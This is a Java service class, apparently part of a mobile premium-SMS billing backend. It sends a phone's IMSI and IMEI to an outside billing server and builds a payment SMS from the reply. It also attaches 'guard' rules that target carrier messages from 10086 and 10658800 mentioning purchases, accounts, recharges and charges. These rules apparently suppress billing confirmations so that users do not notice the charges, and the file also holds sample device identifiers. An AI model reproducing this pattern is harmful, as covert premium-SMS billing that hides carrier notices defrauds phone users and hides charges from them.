package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

/**
 * http://i.thorassist.com/init.php?type=604&siteid=103&codeid=47044&serial=$12$&imsi=&imei=
 * @author leoliu
 *
 */
public class JxMm2DynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(JxMm2DynamicService.class);
	
	private static final String TYPE = "jxMm2";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "type={type}&siteid={siteid}&codeid={codeid}&serial={serial}&imsi={imsi}&imei={imei}";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String siteid = map.get("siteid");
			String codeid = map.get("codeid");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			String stype = map.get("stype");
			String serial = channel.substring(channel.length() - 12);
			
			String param = REQUESTMODEL.replace("{type}",stype).replace("{siteid}",siteid).replace("{codeid}",codeid).replace("{serial}",serial).replace("{imei}",imei).replace("{imsi}",imsi);
			
			String responseJson = GetData.getData(url, param);
			
			xml = parse(responseJson);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseJson){
		
		if(responseJson != null && responseJson.length() > 0){
			
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				String hRet = jo.getString("hRet");
				
				if("0".equals(hRet)){
					JSONObject feeJson = jo.getJSONObject("Fee");
					
					String smsContent = feeJson.getString("sms");
					String dest = feeJson.getString("num");
					
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(smsContent);
					sms.setSmsDest(dest);
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
				}else{
					return DynamicUtils.parseError(hRet);
				}
			}catch(Exception e){
				
			}
		}
		return null;
	}
	
	public static void main(String[] args){
		//http://211.154.162.11/recYdmmAction.action?companycode=W1001&pid=ttddz20c&statement=W100120140529174&imsi=460021281243687&imei=863388028868466&mobileip=202.108.36.125&sign=F0B9CB8094C477E328043EBBB9787362
		
		String url = "http://i.thorassist.com/init.php";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("channel", "10B101a087654321");
		map.put("imei", "862594025131367");
		map.put("imsi", "460025399810374");
		map.put("stype", "604");
		map.put("siteid","103");
		map.put("codeid", "47044");
		
		System.out.println(new JxMm2DynamicService().dynamic(map));
	}

}
